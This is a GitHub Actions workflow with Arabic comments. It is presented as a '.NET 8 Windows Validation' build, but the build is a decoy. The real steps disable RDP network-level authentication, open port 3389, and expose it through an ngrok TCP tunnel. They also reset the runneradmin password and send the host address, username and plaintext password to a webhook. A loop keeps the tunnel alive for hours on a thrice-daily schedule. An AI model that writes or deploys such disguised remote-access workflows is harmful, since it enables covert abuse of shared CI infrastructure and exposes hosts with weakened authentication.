name: .NET 8 Windows Validation

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 200

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Initialize Project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      - name: Enable RDP and Set runneradmin Password
        run: |
          # تعطيل NLA وتمكين RDP
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force

          # فتح منفذ RDP في جدار الحماية
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
          netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1

          # إعادة تشغيل خدمة RDP والانتظار حتى تستقر
          Restart-Service TermService -Force
          Start-Sleep -Seconds 60

      - name: Start ngrok TCP tunnel
        run: |
          # تحميل ngrok
          Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile ngrok.zip
          Expand-Archive ngrok.zip -DestinationPath .\ -Force
          
          # إضافة auth token إذا كان موجوداً
          if ("${{ secrets.NGROK_AUTH_TOKEN }}" -ne "") {
            .\ngrok.exe config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }}
          }
          
          # تشغيل ngrok في الخلفية مع توجيه الإخراج إلى ملفات
          Start-Process -FilePath ".\ngrok.exe" -ArgumentList "tcp 3389 --log=stdout" -RedirectStandardOutput "$env:TEMP\ngrok.log" -RedirectStandardError "$env:TEMP\ngrok.err" -WindowStyle Hidden
          
          # الانتظار 90 ثانية للسماح بإنشاء النفق
          Start-Sleep -Seconds 90
          
          # قراءة السجلات
          $log = Get-Content "$env:TEMP\ngrok.log" -Raw -ErrorAction SilentlyContinue
          $err = Get-Content "$env:TEMP\ngrok.err" -Raw -ErrorAction SilentlyContinue
          
          # استخراج المنفذ من السجل
          $port = $null
          if ($log -match "tcp://0\.tcp\.ngrok\.io:(\d+)") {
            $port = $Matches[1]
          }
          
          # تغيير كلمة مرور المستخدم runneradmin
          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
          Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString $pwd -AsPlainText -Force)
          
          # إعداد رسالة الإشعار
          if ($port) {
            $msg = "✅ ngrok جاهز!`nTarget: 0.tcp.ngrok.io:$port`nUsername: runneradmin`nPassword: $pwd`n`nاتصل دلوقتي (انتظر 30-60 ثانية بعد الرسالة)"
          } else {
            $msg = "❌ ngrok فشل في البدء.`nLog: $log`nError: $err"
          }
          
          # إرسال الإشعار عبر webhook
          $body = @{ content = $msg } | ConvertTo-Json
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        continue-on-error: true

      - name: Run Diagnostics
        run: |
          $rep = "**SysDiag:**`n"

          $ts = Get-Service TermService -ErrorAction SilentlyContinue
          if ($ts) { $rep += "• TermService: $($ts.Status)`n" } else { $rep += "• TermService: Null`n" }

          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
          $rep += "• RDP Settings: fDenyTSConnections=$r1, UserAuthentication=$r2`n"

          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
          if ($pc) { $rep += "• Port 3389: LISTENING`n" } else { $rep += "• Port 3389: NOT LISTENING`n" }

          $fw = Get-NetFirewallRule -DisplayGroup "Remote Desktop" -Enabled True -ErrorAction SilentlyContinue
          if ($fw) { $rep += "• Firewall Rule: Enabled`n" } else { $rep += "• Firewall Rule: Disabled`n" }

          $ng = Get-Process ngrok -ErrorAction SilentlyContinue
          if ($ng) { $rep += "• ngrok: Running (PID $($ng.Id))`n" } else { $rep += "• ngrok: Not running`n" }

          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        continue-on-error: true

      - name: Run Extended Validation (with ngrok monitoring)
        run: |
          # دالة لإعادة تشغيل ngrok إذا توقف
          function Restart-Ngrok {
            $exe = ".\ngrok.exe"
            if (-not (Test-Path $exe)) {
              Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile ngrok.zip
              Expand-Archive ngrok.zip -DestinationPath . -Force
            }
            if ("${{ secrets.NGROK_AUTH_TOKEN }}" -ne "") {
              .\ngrok.exe config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }} > $null 2>&1
            }
            Start-Process -FilePath ".\ngrok.exe" -ArgumentList "tcp 3389 --log=stdout" -RedirectStandardOutput "$env:TEMP\ngrok.log" -WindowStyle Hidden
            Start-Sleep -Seconds 10
            return Get-Process ngrok -ErrorAction SilentlyContinue
          }

          $restartCount = 0
          $maxRestarts = 10
          $endTime = (Get-Date).AddMinutes(190)

          while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
            # 1. التحقق من وجود عملية ngrok
            $ng = Get-Process ngrok -ErrorAction SilentlyContinue
            if (-not $ng) {
              Write-Host "ngrok not running. Restarting... Attempt $($restartCount+1)"
              $ng = Restart-Ngrok
              if ($ng) {
                $restartCount++
                Write-Host "ngrok restarted successfully."
              } else {
                Write-Host "Failed to restart ngrok."
              }
            }

            # 2. اختبار الاتصال وبناء المشروع في أوقات محددة (كل 30 دقيقة)
            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            $minute = (Get-Date).Minute
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              Push-Location ValidationApp
              dotnet build -c Release > $null
              Pop-Location
            }

            # 3. الانتظار 15 دقيقة
            Start-Sleep -Seconds 900
          }

          # إيقاف ngrok في النهاية
          Get-Process ngrok -ErrorAction SilentlyContinue | Stop-Process -Force
          Write-Host "Extended validation completed. Total restarts: $restartCount"

      - name: Cleanup Environment
        run: |
          Get-Process -Name "ngrok" -ErrorAction SilentlyContinue | Stop-Process -Force
        continue-on-error: true

      - name: Finalize Check
        run: Write-Host "Checks completed."
